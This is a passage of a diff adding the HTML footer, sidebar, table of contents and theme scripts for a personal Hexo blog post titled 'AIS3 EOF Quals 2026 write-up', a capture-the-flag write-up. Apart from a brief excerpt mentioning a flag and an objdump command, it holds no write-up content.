+        <span class="icon-brush"></span>
+        17.3k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:28
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ais3-eof-quals-2026-write-up"><span class="toc-number">1.</span> <span class="toc-text"> AIS3 EOF Quals 2026 write-up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#welcome"><span class="toc-number">1.1.</span> <span class="toc-text"> Welcome</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.2.</span> <span class="toc-text"> misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fun"><span class="toc-number">1.2.1.</span> <span class="toc-text"> fun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#saas"><span class="toc-number">1.2.2.</span> <span class="toc-text"> SaaS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-number">1.3.</span> <span class="toc-text"> Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#structured-small"><span class="toc-number">1.3.1.</span> <span class="toc-text"> Structured - Small</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bored"><span class="toc-number">1.3.2.</span> <span class="toc-text"> bored</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.4.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bunphp"><span class="toc-number">1.4.1.</span> <span class="toc-text"> Bun.PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linkoreco"><span class="toc-number">1.4.2.</span> <span class="toc-text"> LinkoReco</span></a></li></ol></li></ol></li></ol>
+  
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Auron" class="lazyload">
+  <div class="sidebar-author-name">Auron</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Auron",
+          title: "AIS3 EOF Quals 2026 write-up",
+          url: "http://example.com/2025/12/25/AIS3%202026%20EOF%20writeup/",
+          excerpt: "",
+          description: "",
+          stripContent: " AIS3 EOF Quals 2026 write-up  Welcome  在 announcement 找到 flag  flag: EOF{2026-quals-in-2025}  misc  fun  這題是一個 eBPF 的 reverse 題  flag.enc: eabbc25677f3084458f0531f86863f226c95d555e6c28bd7 (32 bytes) 使用 llvm-objdump 查看  llvm-objdump -d xdp_prog.o: 12",
+          date: "Thu Dec 25 2025 17:07:32 GMT+0800",
+          updated: "Fri Dec 26 2025 00:23:29 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.9.1' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
